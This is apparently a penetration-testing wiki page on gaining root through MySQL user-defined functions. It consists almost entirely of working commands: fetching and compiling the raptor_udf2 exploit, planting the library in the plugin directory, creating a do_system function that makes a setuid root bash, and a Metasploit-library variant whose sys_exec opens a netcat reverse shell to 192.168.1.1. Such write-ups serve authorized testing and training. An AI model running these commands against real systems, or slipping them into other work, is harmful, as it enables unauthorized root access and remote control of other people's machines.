---
description: PrivEsc with MySQL User Defined Functions
---

# MYSQL

* Mysql service is running with root privileges. (ps aux | grep mysql)
* You know root's password. (Database config files or no password for root)
* If you can not access bash(or similar) shell, you can upload library as hex format. You can find this way in the [subpage](hex.md).

Reference: [https://redteamnation.com/mysql-user-defined-functions/](https://redteamnation.com/mysql-user-defined-functions/)

In this way, we will assume you have shell access on the machine. Steps are:

1. Download UDF library source code
2. Compile it on the machine
3. Connect the database
4. Create new function for code execution
5. Voila!

```
$ mkdir /tmp/test && cd /tmp/test
$ wget http://0xdeadbeef.info/exploits/raptor_udf2.c

$ gcc -g -c raptor_udf2.c -fPIC
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/test/raptor_udf2.so'));
# Look for the value of plugin_dir
mysql> show variables like '%plugin%';
mysql> select * from foo into dumpfile '{plugin_directory}raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function | 
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)

mysql> select do_system('cp /bin/bash /tmp/test/rootbash; chmod +xs /tmp/test/rootbash');
```

If you have no chance to compile it and the machine's arch is x86\_64, you can use precompiled binary to create function.

```
$ cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so .

mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/test/lib_mysqludf_sys_64.so'));
# Look for the value of plugin_dir
mysql> show variables like '%plugin%';
mysql> select * from foo into dumpfile '{plugin_directory}lib_mysqludf_sys_64.so';
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
mysql> select * from mysql.func;
+----------+-----+------------------------+----------+
| name     | ret | dl                     | type     |
+----------+-----+------------------------+----------+
| sys_exec |   2 | lib_mysqludf_sys_64.so | function |
+----------+-----+------------------------+----------+
1 row in set (0.00 sec)

mysql> select sys_exec('nc -e /bin/bash 192.168.1.1 80');
```
